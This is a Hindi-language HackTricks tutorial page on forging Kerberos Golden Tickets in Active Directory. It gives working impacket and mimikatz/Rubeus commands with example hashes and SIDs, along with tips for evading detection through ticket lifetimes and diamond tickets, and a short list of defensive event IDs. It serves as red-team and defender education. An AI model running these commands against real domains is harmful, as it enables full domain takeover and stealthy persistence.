# गोल्डन टिकट

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>

## गोल्डन टिकट

**krbtgt AD अकाउंट के NTLM हैश का उपयोग करके** किसी भी यूजर के रूप में एक मान्य **TGT बनाया जा सकता है**. TGT को TGS के बजाय बनाने का लाभ यह है कि आप डोमेन में किसी भी सेवा (या मशीन) और उस यूजर के रूप में **किसी भी सेवा तक पहुँच सकते हैं**.\
इसके अलावा **krbtgt** के **क्रेडेंशियल्स** को **कभी भी** स्वचालित रूप से **बदला नहीं जाता है**.

**krbtgt** अकाउंट का **NTLM हैश** **lsass प्रोसेस** से या डोमेन में किसी भी DC की **NTDS.dit फाइल** से **प्राप्त किया जा सकता है**. यह NTLM एक **DCsync हमले** के माध्यम से भी प्राप्त किया जा सकता है, जिसे Mimikatz के [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) मॉड्यूल या impacket के उदाहरण [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) के साथ किया जा सकता है. आमतौर पर, **डोमेन एडमिन विशेषाधिकार या इसी तरह के अधिकार आवश्यक होते हैं**, चाहे कोई भी तकनीक इस्तेमाल की जाए.

यह भी ध्यान में रखा जाना चाहिए कि यह संभव है और **पसंदीदा** (opsec) है कि **AES Kerberos कुंजियों (AES128 और AES256) का उपयोग करके टिकट बनाए जाएं**.

{% code title="लिनक्स से" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```
{% endcode %}

{% code title="विंडोज़ से" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**एक बार** आपके पास **गोल्डन टिकट इंजेक्टेड** हो जाने के बाद, आप साझा फाइलों **(C$)** तक पहुँच सकते हैं, और सेवाओं और WMI को निष्पादित कर सकते हैं, इसलिए आप **psexec** या **wmiexec** का उपयोग करके एक शेल प्राप्त कर सकते हैं (ऐसा लगता है कि आप winrm के माध्यम से शेल प्राप्त नहीं कर सकते)।

### सामान्य पता लगाने की विधियों को बायपास करना

गोल्डन टिकट का पता लगाने के सबसे आम तरीके **केर्बेरोस ट्रैफिक की जांच** करना है। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन करता है**, जो इसके साथ किए गए बाद के TGS अनुरोधों में असामान्य रूप से प्रकट होगा।

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

प्रारंभिक ऑफसेट, अवधि और अधिकतम नवीकरण (सभी मिनटों में) को नियंत्रित करने के लिए `/startoffset`, `/endin` और `/renewmax` पैरामीटर का उपयोग करें।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```markdown
दुर्भाग्यवश, TGT की जीवनकाल 4769 के लॉग में नहीं होती है, इसलिए आपको यह जानकारी Windows इवेंट लॉग्स में नहीं मिलेगी। हालांकि, जो आप सहसंबंधित कर सकते हैं वह है **4769 को देखना **_**बिना**_** पूर्व 4768 के**। TGS की मांग TGT के बिना **संभव नहीं है**, और अगर TGT जारी किए जाने का कोई रिकॉर्ड नहीं है, तो हम यह निष्कर्ष निकाल सकते हैं कि इसे ऑफलाइन जाली बनाया गया था।

इस पता लगाने को **बायपास करने के लिए** डायमंड टिकट्स की जांच करें:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### उपाय

* 4624: अकाउंट लॉगऑन
* 4672: एडमिन लॉगऑन
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

अन्य छोटी चालें जो डिफेंडर्स कर सकते हैं वह है **संवेदनशील उपयोगकर्ताओं के लिए 4769 के अलर्ट** जैसे कि डिफॉल्ट डोमेन एडमिनिस्ट्रेटर अकाउंट।

[**Golden Ticket के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** को फॉलो करें।**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
```
